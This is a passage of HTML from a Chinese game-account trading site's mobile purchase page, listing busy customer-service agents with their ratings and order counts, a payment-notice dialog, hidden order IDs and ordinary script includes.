                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s01" data-price="0">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s01" name="service" data-validation-engine="validate[required]" type="radio" value="640" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/14/3ab625651116d5accabb66ea5011411d.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-蕊蕊</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="1级安全评估" class="v-lv lv1"></b></li>
                                        <li class="title note"><span>确认过眼神，我就是对的人！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">3个月服务<span class="pro_service_m_num">566</span>笔订单</span><span class="good">好评率：97%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m " data-id="s02" data-price="0">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s02" name="service" data-validation-engine="validate[required]" type="radio" value="641" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/27/57463cd13c84d6f0706c9fe6ca5a7a0e.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-念念</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="1级安全评估" class="v-lv lv1"></b></li>
                                        <li class="title note"><span>我在这儿等着你~</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">3个月服务<span class="pro_service_m_num">612</span>笔订单</span><span class="good">好评率：97%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s03" data-price="0">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s03" name="service" data-validation-engine="validate[required]" type="radio" value="642" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2021-06-28/19/72c3cdf451f035df02ade64916cfb23d.jpg" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-叶子</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="1级安全评估" class="v-lv lv1"></b></li>
                                        <li class="title note"><span>岁月如歌，歌颂你我！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">3个月服务<span class="pro_service_m_num">602</span>笔订单</span><span class="good">好评率：97%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m " data-id="s04" data-price="0">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s04" name="service" data-validation-engine="validate[required]" type="radio" value="643" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/7/b00170701237e43892a1b96a0f8bcbc7.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-峰峰</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="1级安全评估" class="v-lv lv1"></b></li>
                                        <li class="title note"><span>用心服务，顾客至上！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">3个月服务<span class="pro_service_m_num">633</span>笔订单</span><span class="good">好评率：97%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                                                            <div class="gray js-un-choose-service  pro_service_m  odd" data-id="s05" data-price="0">
                                                                        <div class=" ui-radio"><div class=" ui-radio"><input id="service" class="s05" name="service" data-validation-engine="validate[required]" type="radio" value="644" data-cacheval="false"></div></div>
                                    <div class="left"><img src="https://img2.taoshouyou.com/img/2018-05-04/1/1e9e3bb03862a15b7b28d79c9f474a2f.gif" alt="" width="64" height="64" title=""></div>
                                    <ul class="left">
                                        <li class="title"><sapn class="kefu-name">客服-欣欣</sapn><span class="status status-3" data="-1" data-title="忙碌">忙碌</span></li>
                                        <li><b title="1级安全评估" class="v-lv lv1"></b></li>
                                        <li class="title note"><span>你满意，我开心！</span></li>						
                                    </ul>
                                    <p><span class="pro_service_m_msg">2个月服务<span class="pro_service_m_num">300</span>笔订单</span><span class="good">好评率：83%</span></p>
                                    <!-- 不可选客服提示 -->
                                                                        <div class="promptkefu">该客服在忙碌中，暂不可选!</div>
                                                                    </div>                            
                             
                        </div>
                                                <div class="clear"></div>
                    </div>
                </div>
            </div>
        </div>
          
    </form>
</div>
<img src="http://m.taoshouyou.com/img/loading.gif" style="display:none" id="loading">

<div class="message"></div>
  

<!--支付注意弹窗-->
<div class="pay-attention" data-role="none">
    <div class="attention-dialog-nextwrap">
        <div class="attention-dialog">
            <p class="title">温馨提示</p>
            <p class="content"></p>
            <ul class="dialog-button button1">
                <li class="close">关闭</li>
            </ul>
        </div>
    </div>
</div>

<!--提前帐号提示-->
<div class="extract-tips-box">
    <div class="extract-mask"></div>
    <div class="extract-contont">
        <img src="/img/insurance/tips.png" alt="">
        <div class="extract-btn">确认</div>
    </div>
</div>
<input type="hidden" id="js-b-limit-userid" value="10183040">
<input type="hidden" id="js-b-limit-sellerid" value="9982132">
<input type="hidden" id="js-b-limit-gameid" value="2256">
<input type="hidden" id="js-b-limit-clientid" value="28">

<script src="https://cdn.bootcss.com/jquery/1.7.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/crypto-js/3.1.2/rollups/tripledes.js"></script>
<script src="https://cdn.bootcss.com/crypto-js/3.1.2/components/mode-ecb.js"></script>
<script src="https://cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.js"></script>

            <script type="text/javascript" src="http://m.taoshouyou.com/js/jquery/jquery_2_1_3_min.js"></script> 
            <script type="text/javascript" src="http://m.taoshouyou.com/js/common.js"></script> 
            <script type="text/javascript" src="http://m.taoshouyou.com/js/jquery/jqm_1_4_5_min.js"></script>
        <script src="http://m.taoshouyou.com/js/jquery/jquery.validationEngine-zh_CN.js"></script>
<script src="http://m.taoshouyou.com/js/jquery/jquery.validationEngine.min.js"></script>
<script src="http://m.taoshouyou.com/js/sensorprepropties.js"></script>
<script src="http://m.taoshouyou.com/js/user/trade/sensors.js"></script>
<script src="http://m.taoshouyou.com/js/user/selltrade/lib/weui.js"></script>
<script src="http://m.taoshouyou.com/js/user/buy/trade.js?ws=0.7"></script>
<script src="http://m.taoshouyou.com/js/recognition/recognition.js?v=0.2"></script>
<script src="http://m.taoshouyou.com/assets/9bc06dd247a49f0e1decf09254a21f68/yii.js?v=1642418738"></script>            <!-- <script type="text/javascript">$(function() {$("#toTop").scrollToTop(1);});</script> -->
        </body>
        </html>